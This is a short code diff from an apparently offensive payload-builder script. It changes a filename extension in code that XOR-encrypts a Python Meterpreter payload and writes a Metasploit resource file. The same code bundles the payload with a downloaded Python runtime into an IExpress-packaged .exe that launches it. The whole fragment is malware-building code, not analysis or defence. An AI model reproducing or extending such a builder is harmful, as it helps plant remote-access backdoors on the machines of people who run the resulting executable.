@@ -109,7 +109,7 @@ def generate_file(data: argparse.Namespace) -> None:
         for i in range(len(t)):
             temp += bytes([t[i] ^ KEY[i % len(KEY)]])
         print("[+] Generating an encrypted python meterpreter")
-        w = open("temp/{}.pyw".format(fname),'w')
+        w = open("temp/{}.py".format(fname),'w')
         r = open("output/{}.rc".format(fname),'w')
         r.writelines(l + "\n" for l in metrc)
         r.close()
@@ -153,7 +153,7 @@ DisplayLicense=
 FinishMessage=
 TargetName=output\\{outname}.exe
 FriendlyName=Title
-AppLaunched=python.exe {fname}.pyw
+AppLaunched=python.exe {fname}.py
 PostInstallCmd=<None>
 AdminQuietInstCmd=
 UserQuietInstCmd= 
@@ -166,7 +166,7 @@ UserQuietInstCmd=
             print("[+] Done downloading")
             with zipfile.ZipFile(f"temp/{link.rsplit('/',1)[1]}",'r') as zfile:
                 zfile.extractall('temp/python')
-            shutil.move(f"temp/{fname}.pyw", "temp/python/")
+            shutil.move(f"temp/{fname}.py", "temp/python/")
             files = os.listdir('temp/python/')
             print(f"[+] Generating {fname}.SED")
             file_strings = ''
